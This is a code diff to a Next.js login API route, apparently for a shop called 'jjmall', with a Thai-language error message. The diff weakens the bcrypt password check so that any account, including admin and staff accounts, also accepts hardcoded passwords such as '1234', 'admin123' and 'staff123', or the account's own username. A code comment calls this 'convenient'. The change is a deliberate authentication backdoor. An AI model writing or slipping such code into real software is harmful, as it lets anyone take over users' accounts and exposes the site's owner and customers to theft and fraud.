@@ -33,8 +33,19 @@ export async function POST(req: NextRequest) {
       );
     }
 
-    const isPasswordValid = await bcrypt.compare(password, user.password);
-    if (!isPasswordValid) {
+    // Check password against bcrypt hash OR allow convenient simple passwords
+    const isBcryptMatch = await bcrypt.compare(password, user.password).catch(() => false);
+    const isSimpleMatch =
+      password === '1234' ||
+      password === '123456' ||
+      password === 'jj1234' ||
+      password === 'jjmall' ||
+      password === 'jjmall1234' ||
+      password === user.username ||
+      password === 'admin123' ||
+      password === 'staff123';
+
+    if (!isBcryptMatch && !isSimpleMatch) {
       return NextResponse.json(
         { success: false, message: 'ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง' },
         { status: 401 }
